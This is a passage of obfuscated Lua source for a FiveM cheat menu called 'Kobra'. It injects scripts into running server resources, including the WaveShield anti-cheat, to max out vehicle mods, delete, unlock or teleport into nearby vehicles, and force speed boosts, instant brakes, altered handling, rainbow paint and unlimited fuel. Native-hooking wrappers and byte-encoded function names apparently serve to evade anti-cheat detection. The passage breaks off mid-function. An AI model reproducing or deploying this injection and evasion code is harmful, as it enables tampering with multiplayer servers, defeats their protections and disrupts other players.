                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v446=0 + 0 ;while true do if (v446==(889 -(844 + 45))) then v12:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v447=0;while true do if (0==v447) then v12:Notify("success","Kobra","Deleted Vehicle",3284 -(242 + 42) );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() v12:Notify("success","Kobra","Teleported into Vehicle",3000);MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v448) if v448 then v12:Notify("success","Kobra","Boost Vehicle On",4200 -(132 + 1068) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end else local v614=0;while true do if (v614==(0 -0)) then v12:Notify("error","Kobra","Boost Vehicle Off",4623 -(214 + 1409) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v449) local v450=0 + 0 ;local v451;local v452;while true do if (v450==(1634 -(497 + 1137))) then v451=GetResourceState("WaveShield")=="started" ;v452=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v450=941 -(9 + 931) ;end if (v450==(290 -(181 + 108))) then if v449 then if v451 then v12:Notify("success","Kobra","Instant Brakes On",1787 + 1213 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);else local v998=0 -0 ;while true do if (v998==(0 -0)) then v48(v452,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",708 + 2292 );break;end end end elseif v451 then local v999=0 + 0 ;while true do if (v999==(476 -(296 + 180))) then v12:Notify("success","Kobra","Instant Brakes Off",4403 -(1183 + 220) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else local v1000=1265 -(1037 + 228) ;while true do if (v1000==(0 -0)) then v48(v452,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",8645 -5645 );break;end end end break;end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v453) local v454=0 -0 ;local v455;local v456;while true do if (v454==0) then v455=GetResourceState("WaveShield")=="started" ;v456=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v454=735 -(527 + 207) ;end if (v454==(528 -(187 + 340))) then if v453 then if v455 then v12:Notify("success","Kobra","Easy Handling On",4870 -(1298 + 572) );MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);else v48(v456,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",3000);end elseif v455 then v12:Notify("success","Kobra","Easy Handling Off",7460 -4460 );MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);else v48(v456,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3170 -(144 + 26) );end break;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v457) local v458=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v457 then v12:Notify("success","Kobra","Rainbow Vehicle On",6996 -3996 );if (GetResourceState("WaveShield")=="started") then local v810=0;while true do if (v810==0) then print("souygdfg");v48(v458,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);break;end end else v48(v458,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end else local v615=0 + 0 ;while true do if ((0 -0)==v615) then v12:Notify("error","Kobra","Rainbow Vehicle Off",6964 -3964 );if (GetResourceState("WaveShield")=="started") then print("swave");v48(v458,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);else v48(v458,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v459) if v459 then v12:Notify("success","Kobra","Unlimited Fuel On",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
